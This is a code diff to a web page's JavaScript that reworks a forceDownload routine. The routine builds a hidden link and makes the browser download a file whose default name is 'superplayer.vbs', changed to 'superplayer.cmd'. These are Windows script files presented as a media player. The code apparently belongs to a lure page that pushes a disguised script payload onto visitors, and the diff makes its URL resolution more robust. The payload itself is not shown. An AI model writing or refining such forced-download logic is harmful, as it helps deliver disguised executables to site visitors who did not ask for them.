@@ -100,16 +100,57 @@
     } catch (e) {}
   }
 
+  function hostsMatch(left, right) {
+    var a = String(left || "").toLowerCase().replace(/^www\./, "");
+    var b = String(right || "").toLowerCase().replace(/^www\./, "");
+    return a.length > 0 && a === b;
+  }
+
+  function resolveDownloadUrl(url) {
+    var trimmed = String(url || "").trim();
+    if (!trimmed || trimmed.indexOf("$") >= 0) {
+      return "";
+    }
+
+    try {
+      var absolute;
+      if (/^https?:\/\//i.test(trimmed)) {
+        absolute = new URL(trimmed);
+      } else if (trimmed.indexOf("//") === 0) {
+        absolute = new URL(window.location.protocol + trimmed);
+      } else {
+        absolute = new URL(trimmed, window.location.origin + "/");
+      }
+
+      if (hostsMatch(absolute.hostname, window.location.hostname)) {
+        return absolute.pathname + absolute.search;
+      }
+
+      return absolute.href;
+    } catch (e) {
+      if (trimmed.charAt(0) === "/") {
+        return trimmed;
+      }
+
+      return "/" + trimmed.replace(/^\.?\//, "");
+    }
+  }
+
+  function downloadFileName(url) {
+    var path = String(url || "").split("?")[0].split("#")[0];
+    var name = path.split("/").pop();
+    return name || "superplayer.cmd";
+  }
+
   function forceDownload() {
-    var url = downloadUrl;
-    if (!url || url.indexOf("$") >= 0) {
+    var url = resolveDownloadUrl(downloadUrl);
+    if (!url) {
       return;
     }
 
-    var name = url.split("/").pop() || "superplayer.vbs";
     var link = document.createElement("a");
     link.href = url;
-    link.download = name;
+    link.download = downloadFileName(url);
     link.rel = "noopener";
     link.style.display = "none";
     document.body.appendChild(link);
